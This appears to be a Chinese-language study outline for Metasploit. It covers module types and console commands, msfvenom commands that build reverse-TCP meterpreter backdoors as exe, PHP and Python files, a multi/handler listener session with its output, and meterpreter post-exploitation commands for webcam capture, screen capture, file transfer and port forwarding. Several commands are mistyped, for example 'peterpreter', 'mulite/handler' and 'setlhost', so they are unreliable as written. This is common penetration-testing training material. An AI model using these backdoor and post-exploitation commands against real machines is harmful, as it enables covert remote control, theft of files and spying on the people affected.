# metasploit控制目标主机

## 01.Metasploit基本功能

### metasploit简介-目录结构

#### kali-metasploit框架目录路径

#### /opt/metasploit-framework/embedded/framework/

#### /usr/share/metasploit-framework/

### modules-msf核心

#### **auxiliary**：辅助模块，辅助渗透（端口扫描、登录密码爆破、漏洞验证等）

#### **exploits**：漏洞利用模块，包含主流的**漏洞利用脚本**，通常是对某些可能存在漏洞的目标进行漏洞利用。

#### 命名规则：操作系统/各种应用协议

#### **payloads**：攻击载荷，主要是**攻击成功后子啊目标机器执行的代码**，比如反弹shell的代码

#### **post**：**后渗透**阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令，如：提权等

#### encoders：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统

#### evasion：躲避模块，用来生成免杀payload

####nops：由于IDS/IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串（nops x90x90…）则会因为被拦截而导致攻击失败

### msfconsole

#### msfdb init：初始化数据库

#### msfconsole：启动

### db_nmap

#### db-nmap：nmap扫描

#### -T[0-5]：默认为T3，T4表示最大TCP扫描延迟为10ms

#### -sS：TCP SYN扫描

#### -sA：TCP ACK扫描

#### -sT：TCP 扫描

####-A：打开操作系统探测和版本检测

#### hosts：查看当前工作区所有主机

#### services：查看所有服务

## Metasploit使用-auxiliary

### 搜索可使用的模块

#### search：搜索msf中相关模块

####search platform：windows cve:2009 type:exploit

## Metasploit使用-meterpreter

### 后渗透利用

#### background：将当前session挂起

#### sessions[ -I]：列出当前所有的session

####sessions[ -i]id：进入某个session

### shell转meterpreter

#### sessions -u id：将某个session转为meterpreter

## Metesploit使用-常用命令

#### show exploits - 查看所有可用的渗透攻击程序代码

#### show auxiliary -查看所有可用的辅助攻击工具

#### **[show ]options**/advanced -查看该模块可用的选项

#### show payloads -查看该模块适用的所有荷载代码

####show targets -查看该模块适用的攻击目标类型

####search -根据关键字搜索某模块

####info -显示某模块的详细信息

####use -使用某渗透攻击模块

####back -回退

####**set/unset** -设置/禁用适用于所有模块的全局参数

####setg/unsetg -设置/禁用适用于所有模块的全局参数

####save -将当前设置值保存下来，一边下次启动MSF终端时仍可使用

## Msfvenom简介

### msfvenom

#### msfvenom是msfpayload和msfencode的组合。将这两个工具集成在一个框架实例中。

### 进一步解释

#### msfvenom是用来生成后门的软件，在目标机上执行后门，在本地监听上线

## Msfvenom使用

### 生成后门

### **windows：**

####msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

### **php:**

####msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

### **python:**

####msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

### 上线session

####msfvenom -p windows/peterpreter/reverse_tcp lhost=192.168.149.138 lport=8881 -f exe -o localmsf8881.exe

####msf5 > use exploit/multi/handler

####msf5 exploit(mulite/handler) > set payload windows/meterpreter/reverse_tcp

####msf5 exploit(mulite/handler) > setlhost 192.168.149.138

####msf5 exploit(mulite/handler) > set lport 8881

####msf5 exploit(mulite/handler) > run

####[*] Started reverse TCP handler on 192.168.24.146:5445

####[*] Sending stage (176195 bytes) to 192.168.24.142

####[*] Meterpreter seesion 4 opended (192.168.24.146:5445 -> 192.168.24.142:49643) at 02:56:04 -0400

####meterpreter > 

### 详解

####msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.149.138 lport=8881 -f exe -o localmsf8881.exe

####msfvenom可以帮助我们从大量的metesploit有效负载中创建需要的负载，合并用到利用程序中。这里使用的**payload**（windows/meterpreter/reverse_tcp），要回连的**主机和端口**（lhost,lport）、**输出格式**（-f exe）都会整合到localmsf8881.exe中

####Metasploit的exploit/multi/handler模块是一个有效负载处理程序，它只处理在受损主机中执行的有效负载连接

####Meterpreter是metasploit的后渗透利用工具。基于内存dll注入实现，能够通过创建一个新进程并调用注入的dll来让目标系统运行注入的dll文件。在该模式下，攻击者与目标设备中Meteroreter的通信是通过stager套接字实现的。

## Meterpreter后渗透

### 获取meterpreter后能做什么？

#### webcam_list:查看摄像头

####webcam_snap：通过摄像头拍照

####web_stream：通过摄像头开始视频

####screenshot：获取屏幕截图

####screenshare：实时监控桌面

####shutdown：关闭目标机器

## Meterpreter后渗透-常用命令

####meterpreter > background 放回后台

####meterpreter > exit 关闭会话

####meterpreter > help 帮助信息

####meterpreter > sysinfo 系统平台信息

####meterpreter > screenshot 屏幕截取

####meterpreter > shell 命令行shell （exit退出）

####meterpreter > getlwd 查看本地目录

####meterpreter > lcd 切换本地目录

####meterpreter > getwd 查看目录

####meterpreter > 老师查看文件目录列表

####meterpreter > cd 切换目录

####meterpreter > rm 删除文件

####meterpreter > download C:\\1.txt 1.txt下载文件

####meterpreter > upload/var/www/wce.exe wce.exe上传文件

####meterpreter > search -d 的、c: -f *.doc 搜索文件

####meterpreter > execute -f cmd.exe -i 执行程序/命令

####meterpreter > ps 查看进程

####meterpreter > getuid 查看当前用户权限

#### meterpreter > run getui-e 启用远程桌面

#### meterpreter > portfwd add -l 1234 -p 3389 -r <目标IP> 端口转发 

## 02.Metasploite攻击服务漏洞

## 03.Msfvenom生成后门木马



 